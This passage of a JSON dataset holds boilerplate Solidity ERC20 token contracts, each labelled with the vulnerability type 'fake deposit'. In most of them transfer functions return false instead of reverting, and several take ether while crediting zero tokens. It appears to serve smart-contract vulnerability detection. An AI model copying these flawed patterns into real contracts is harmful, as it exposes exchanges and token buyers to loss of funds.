_to, uint256 _value) returns (bool success) {\r\n     \r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract GoldenRetriever is StandardToken { \r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                  \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'GOLDEN1.0'; \r\n    uint256 public unitsOneEthCanBuy;     \r\n    uint256 public totalEthInWei;         \r\n    address public fundsWallet;           \r\n\r\n   \r\n    function GoldenRetriever() {\r\n        balances[msg.sender] = 100000000000000000000000000000;               \r\n        totalSupply = 100000000000000000000000000000;\r\n        name = \"Golden Retriever\";\r\n        decimals = 18;                                               \r\n        symbol = \"GOLDEN\";                                             \r\n        unitsOneEthCanBuy = 0;          //7% bonus= OneEth//                           \r\n        fundsWallet = msg.sender;                                    \r\n    }\r\n\r\n    function() payable{\r\n        totalEthInWei = totalEthInWei + msg.value;\r\n        uint256 amount = msg.value * unitsOneEthCanBuy;\r\n        require(balances[fundsWallet] >= amount);\r\n\r\n        balances[fundsWallet] = balances[fundsWallet] - amount;\r\n        balances[msg.sender] = balances[msg.sender] + amount;\r\n\r\n        Transfer(fundsWallet, msg.sender, amount); \r\n\r\n        fundsWallet.transfer(msg.value);                               \r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n       \r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.25;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n    \r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n     \r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract WAKANDAINUTOKENETH is StandardToken { \r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                  \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'WKDE1.0'; \r\n    uint256 public unitsOneEthCanBuy;     \r\n    uint256 public totalEthInWei;         \r\n    address public fundsWallet;           \r\n\r\n   \r\n    function WAKANDAINUTOKENETH() {\r\n        balances[msg.sender] = 100000000000000000000000000000;               \r\n        totalSupply = 100000000000000000000000000000;\r\n        name = \"WAKANDA INU TOKEN ETH\";\r\n        decimals = 18;                                               \r\n        symbol = \"WKDE\";                                             \r\n        unitsOneEthCanBuy = 0;          //7% bonus= OneEth//                           \r\n        fundsWallet = msg.sender;                                    \r\n    }\r\n\r\n    function() payable{\r\n        totalEthInWei = totalEthInWei + msg.value;\r\n        uint256 amount = msg.value * unitsOneEthCanBuy;\r\n        require(balances[fundsWallet] >= amount);\r\n\r\n        balances[fundsWallet] = balances[fundsWallet] - amount;\r\n        balances[msg.sender] = balances[msg.sender] + amount;\r\n\r\n        Transfer(fundsWallet, msg.sender, amount); \r\n\r\n        fundsWallet.transfer(msg.value);                               \r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n       \r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract RicoContract is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 500000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 100000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"RicoCoin\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals for display purposes\r\n        symbol = \"RICO\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.25;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n    \r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n     \r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract JapaneseChin is StandardToken { \r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                  \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'Chin.0'; \r\n    uint256 public unitsOneEthCanBuy;     \r\n    uint256 public totalEthInWei;         \r\n    address public fundsWallet;           \r\n\r\n   \r\n    function JapaneseChin() {\r\n        balances[msg.sender] = 10000000000000000000000000000;               \r\n        totalSupply = 10000000000000000000000000000;\r\n        name = \"Japanese Chin\";\r\n        decimals = 18;                                               \r\n        symbol = \"Chin\";                                             \r\n        unitsOneEthCanBuy = 0;          //7% bonus= OneEth//                           \r\n        fundsWallet = msg.sender;                                    \r\n    }\r\n\r\n    function() payable{\r\n        totalEthInWei = totalEthInWei + msg.value;\r\n        uint256 amount = msg.value * unitsOneEthCanBuy;\r\n        require(balances[fundsWallet] >= amount);\r\n\r\n        balances[fundsWallet] = balances[fundsWallet] - amount;\r\n        balances[msg.sender] = balances[msg.sender] + amount;\r\n\r\n        Transfer(fundsWallet, msg.sender, amount); \r\n\r\n        fundsWallet.transfer(msg.value);                               \r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n       \r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.25;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n    \r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n     \r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract NigerianEkuke is StandardToken { \r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                  \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'EKUKE1.0'; \r\n    uint256 public unitsOneEthCanBuy;     \r\n    uint256 public totalEthInWei;         \r\n    address public fundsWallet;           \r\n\r\n   \r\n    function NigerianEkuke() {\r\n        balances[msg.sender] = 1000000000000000000000000000000;               \r\n        totalSupply = 1000000000000000000000000000000;\r\n        name = \"Nigerian Ekuke\";\r\n        decimals = 18;                                               \r\n        symbol = \"EKUKE\";                                             \r\n        unitsOneEthCanBuy = 0;          //7% bonus= OneEth//                           \r\n        fundsWallet = msg.sender;                                    \r\n    }\r\n\r\n    function() payable{\r\n        totalEthInWei = totalEthInWei + msg.value;\r\n        uint256 amount = msg.value * unitsOneEthCanBuy;\r\n        require(balances[fundsWallet] >= amount);\r\n\r\n        balances[fundsWallet] = balances[fundsWallet] - amount;\r\n        balances[msg.sender] = balances[msg.sender] + amount;\r\n\r\n        Transfer(fundsWallet, msg.sender, amount); \r\n\r\n        fundsWallet.transfer(msg.value);                               \r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n       \r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.16;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 2000000000000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply =2000000000000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"MSC BLUME\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals for display purposes\r\n        symbol = \"MRC\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if 